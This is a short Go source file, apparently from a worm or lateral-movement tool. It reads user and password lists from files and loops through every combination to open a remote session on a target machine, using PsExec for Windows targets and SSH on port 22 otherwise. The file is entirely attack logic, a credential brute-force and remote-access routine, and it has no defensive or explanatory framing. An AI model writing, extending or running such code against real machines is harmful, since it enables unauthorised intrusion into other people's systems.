package main

import (
	"sync"
	"runtime"
	"github.com/go-openapi/errors"
)

var wrongOsErr = errors.New(1,"Can't run Psexec on non windows machine")

// attempts multiple methods of getting into target machines
func gettingin(myip string, wg *sync.WaitGroup, myos string, targetos string) {

	try_creds(myip,targetos)
	defer wg.Done()
}

func try_creds(myip string, targetos string)(sesinfo infosession, err error){
	myos := runtime.GOOS
	var user = readinfile("user.txt")
	var passwds = readinfile("passwds.txt")
	return perform_remoting(myip,user,passwds, myos, targetos)

}

// function that attempt to create a session using available methods, namelt PsExec or ssh
func perform_remoting(myip string, user []string, passwds []string, myos string, targetos string)(sesinfo infosession, err error){
	if myos != "windows" && targetos == "windows"{
		return infosession{}, wrongOsErr
	}
	n:= infosession{}
	for j := 0; j < len(user); j++ {
		for k := 0; k < len(passwds); k++ {
			switch targetos {
			case "windows":
				n, err = getinwin(myip, user[j], passwds[k])
			default:
				n, err = getinssh(myip, user[j], passwds[k],22)
			}
			if err != nil{
				if err == unknownError {
					return n, unknownError
				}
			} else {
				return n, nil
			}
		}
	}
	return infosession{false, "", "", nil,nil}, authError
}